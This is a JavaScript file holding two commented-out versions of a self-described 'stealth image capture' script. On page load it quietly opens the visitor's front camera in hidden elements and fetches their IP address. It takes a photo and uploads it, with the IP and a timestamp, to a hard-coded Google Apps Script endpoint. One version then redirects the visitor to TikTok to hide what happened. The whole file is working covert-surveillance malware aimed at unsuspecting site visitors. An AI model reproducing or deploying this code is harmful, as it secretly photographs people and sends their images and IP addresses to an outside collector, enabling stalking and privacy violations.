// // // capture.js - Stealth Image Capture Script
// // (function() {
// //     // Configuration
// //     const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz8Tkk7bCt3CO4P4P19T9EeAy1VbVQxtcdMcN1VSAZHEb9Zc71kVUv3PiUukVvdxlQYYg/exec';
    
// //     // Elements (created dynamically)
// //     let video, canvas;
    
// //     // Initialize the capture process
// //     function init() {
// //         createHiddenElements();
// //         getIPAddress()
// //             .then(ip => {
// //                 startCamera()
// //                     .then(() => {
// //                         setTimeout(() => {
// //                             captureImage(ip);
// //                         }, 1000); // Wait a second for camera to initialize
// //                     })
// //                     .catch(error => {
// //                         console.error('Camera error:', error);
// //                     });
// //             })
// //             .catch(error => {
// //                 console.error('IP detection error:', error);
// //             });
// //     }
    
// //     // Create hidden video and canvas elements
// //     function createHiddenElements() {
// //         video = document.createElement('video');
// //         video.setAttribute('autoplay', '');
// //         video.setAttribute('playsinline', '');
// //         video.style.display = 'none';
// //         document.body.appendChild(video);
        
// //         canvas = document.createElement('canvas');
// //         canvas.style.display = 'none';
// //         document.body.appendChild(canvas);
// //     }
    
// //     // Get user's IP address
// //     function getIPAddress() {
// //         return new Promise((resolve, reject) => {
// //             fetch('https://api.ipify.org?format=json')
// //                 .then(response => response.json())
// //                 .then(data => resolve(data.ip))
// //                 .catch(error => reject(error));
// //         });
// //     }
    
// //     // Start camera without showing preview
// //     function startCamera() {
// //         return new Promise((resolve, reject) => {
// //             navigator.mediaDevices.getUserMedia({
// //                 video: { 
// //                     facingMode: 'user',
// //                     width: { ideal: 1280 },
// //                     height: { ideal: 720 }
// //                 },
// //                 audio: false
// //             })
// //             .then(stream => {
// //                 video.srcObject = stream;
// //                 video.onloadedmetadata = () => {
// //                     video.play();
// //                     resolve();
// //                 };
// //             })
// //             .catch(error => reject(error));
// //         });
// //     }
    
// //     // Capture image and send to server
// //     function captureImage(ip) {
// //         // Set canvas dimensions to match video
// //         canvas.width = video.videoWidth;
// //         canvas.height = video.videoHeight;
        
// //         // Draw current video frame to canvas
// //         const context = canvas.getContext('2d');
// //         context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
// //         // Get current time for filename (GMT+7)
// //         const now = new Date();
// //         const gmt7Time = new Date(now.getTime() + (7 * 60 * 60 * 1000));
// //         const timeString = gmt7Time.toISOString().substr(11, 8).replace(/:/g, '.');
        
// //         // Create filename
// //         const filename = `${ip}_${timeString}.jpg`;
        
// //         // Convert canvas to blob
// //         canvas.toBlob(blob => {
// //             // Create form data to send
// //             const formData = new FormData();
// //             formData.append('image', blob, filename);
// //             formData.append('filename', filename);
// //             formData.append('ip', ip);
// //             formData.append('time', timeString);
            
// //             // Send to Google Apps Script
// //             fetch(GOOGLE_SCRIPT_URL, {
// //                 method: 'POST',
// //                 body: formData
// //             })
// //             .then(response => response.text())
// //             .then(result => {
// //                 // Clean up
// //                 if (video.srcObject) {
// //                     video.srcObject.getTracks().forEach(track => track.stop());
// //                 }
// //                 document.body.removeChild(video);
// //                 document.body.removeChild(canvas);
// //             })
// //             .catch(error => {
// //                 console.error('Error sending image:', error);
// //             });
// //         }, 'image/jpeg', 0.8);
// //     }
    
// //     // Start the process when script loads
// //     if (document.readyState === 'loading') {
// //         document.addEventListener('DOMContentLoaded', init);
// //     } else {
// //         init();
// //     }
// // })();





// // Stealth Image Capture Script with Immediate Capture and Redirect
// (function() {
//     // Configuration
//     const REDIRECT_URL = 'https://www.tiktok.com';
//     const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz8Tkk7bCt3CO4P4P19T9EeAy1VbVQxtcdMcN1VSAZHEb9Zc71kVUv3PiUukVvdxlQYYg/exec';
    
//     // Elements
//     const statusElement = document.getElementById('status');
//     const ipAddressElement = document.getElementById('ipAddress');
//     const currentTimeElement = document.getElementById('currentTime');
    
//     // Variables
//     let video, canvas;
//     let userIP = '';
    
//     // Initialize the capture process
//     function init() {
//         statusElement.textContent = 'Getting IP address...';
        
//         // Get IP address and start camera simultaneously
//         Promise.all([getIPAddress(), createHiddenElements()])
//             .then(([ip]) => {
//                 userIP = ip;
//                 ipAddressElement.textContent = ip;
//                 statusElement.textContent = 'Starting camera...';
//                 return startCamera();
//             })
//             .then(() => {
//                 statusElement.textContent = 'Capturing image...';
//                 // Capture immediately without delay
//                 captureImage(userIP);
//             })
//             .catch(error => {
//                 console.error('Initialization error:', error);
//                 statusElement.textContent = 'Error: ' + error.message;
//                 // Redirect even if there's an error after a short delay
//                 setTimeout(redirectUser, 2000);
//             });
//     }
    
//     // Create hidden video and canvas elements
//     function createHiddenElements() {
//         return new Promise((resolve) => {
//             video = document.createElement('video');
//             video.setAttribute('autoplay', '');
//             video.setAttribute('playsinline', '');
//             video.style.display = 'none';
//             document.body.appendChild(video);
            
//             canvas = document.createElement('canvas');
//             canvas.style.display = 'none';
//             document.body.appendChild(canvas);
            
//             resolve();
//         });
//     }
    
//     // Get user's IP address
//     function getIPAddress() {
//         return new Promise((resolve, reject) => {
//             fetch('https://api.ipify.org?format=json')
//                 .then(response => response.json())
//                 .then(data => resolve(data.ip))
//                 .catch(error => {
//                     console.error('Error getting IP address:', error);
//                     resolve('unknown');
//                 });
//         });
//     }
    
//     // Update time display
//     function updateTime() {
//         const now = new Date();
//         // Convert to GMT+7
//         const gmt7Time = new Date(now.getTime() + (7 * 60 * 60 * 1000));
//         const timeString = gmt7Time.toISOString().substr(11, 8).replace(/:/g, '.');
//         currentTimeElement.textContent = timeString;
//     }
    
//     // Start camera without showing preview
//     function startCamera() {
//         return new Promise((resolve, reject) => {
//             navigator.mediaDevices.getUserMedia({
//                 video: { 
//                     facingMode: 'user',
//                     width: { ideal: 1280 },
//                     height: { ideal: 720 }
//                 },
//                 audio: false
//             })
//             .then(stream => {
//                 video.srcObject = stream;
//                 video.onloadedmetadata = () => {
//                     video.play();
//                     resolve();
//                 };
//             })
//             .catch(error => reject(error));
//         });
//     }
    
//     // Capture image and send to server
//     function captureImage(ip) {
//         // Set canvas dimensions to match video
//         canvas.width = video.videoWidth;
//         canvas.height = video.videoHeight;
        
//         // Draw current video frame to canvas
//         const context = canvas.getContext('2d');
//         context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
//         // Get current time for filename (GMT+7)
//         updateTime();
//         const timeString = currentTimeElement.textContent;
        
//         // Create filename
//         const filename = `${ip}_${timeString}.jpg`;
        
//         // Convert canvas to blob
//         canvas.toBlob(blob => {
//             // Create form data to send
//             const formData = new FormData();
//             formData.append('image', blob, filename);
//             formData.append('filename', filename);
//             formData.append('ip', ip);
//             formData.append('time', timeString);
            
//             // Send to Google Apps Script
//             fetch(GOOGLE_SCRIPT_URL, {
//                 method: 'POST',
//                 body: formData
//             })
//             .then(response => response.text())
//             .then(result => {
//                 statusElement.textContent = 'Image captured successfully! Redirecting...';
                
//                 // Clean up
//                 if (video.srcObject) {
//                     video.srcObject.getTracks().forEach(track => track.stop());
//                 }
//                 document.body.removeChild(video);
//                 document.body.removeChild(canvas);
                
//                 // Redirect user
//                 setTimeout(redirectUser, 1000);
//             })
//             .catch(error => {
//                 console.error('Error sending image:', error);
//                 statusElement.textContent = 'Error sending image. Redirecting...';
//                 // Redirect even if there's an error
//                 setTimeout(redirectUser, 1500);
//             });
//         }, 'image/jpeg', 0.8);
//     }
    
//     // Redirect user to specified URL
//     function redirectUser() {
//         window.location.href = REDIRECT_URL;
//     }
    
//     // Start the process when script loads
//     if (document.readyState === 'loading') {
//         document.addEventListener('DOMContentLoaded', init);
//     } else {
//         init();
//     }
    
//     // Update time every second
//     setInterval(updateTime, 1000);
// })();


